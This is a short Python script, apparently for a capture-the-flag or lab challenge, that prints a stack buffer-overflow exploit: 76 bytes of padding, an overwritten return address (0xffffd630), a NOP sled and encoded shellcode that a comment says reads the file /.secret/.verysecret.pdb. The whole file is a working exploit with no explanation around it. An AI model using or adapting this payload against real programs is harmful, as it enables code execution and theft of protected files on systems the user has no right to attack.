#!/usr/bin/python

#buffer = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
buffer = '\x41' * 76

#EIP = "BBBB"
#ffffd710
EIP = "\x30\xd6\xff\xff"    # 0xffffd630

nop = '\x90' * 5

# RemoteMeterpreterDebugFile=, CMD=cat 
# /.secret/.verysecret.pdb
buf =  b""
buf += b"\xda\xd2\xb8\x90\xc7\x12\xcc\xd9\x74\x24\xf4\x5e\x29"
buf += b"\xc9\xb1\x11\x83\xc6\x04\x31\x46\x13\x03\xd6\xd4\xf0"
buf += b"\x39\xbc\xd1\xac\x58\x12\x80\x24\x76\xf1\xc5\x52\xe0"
buf += b"\xda\xa6\xf4\xf1\x4c\x66\x67\x9b\xe2\xf1\x84\x09\x12"
buf += b"\x1c\x4b\xae\xe2\x7c\x2a\xda\xc2\xad\x82\x51\x67\xd1"
buf += b"\xa8\xf0\x13\x3a\x63\x8d\xbe\x36\x02\x02\x25\xd4\x86"
buf += b"\x81\xd1\x34\x17\x2e\x7b\x49\x80\xfd\xf2\xa8\xe3\x82"

print(buffer + EIP + nop + buf)
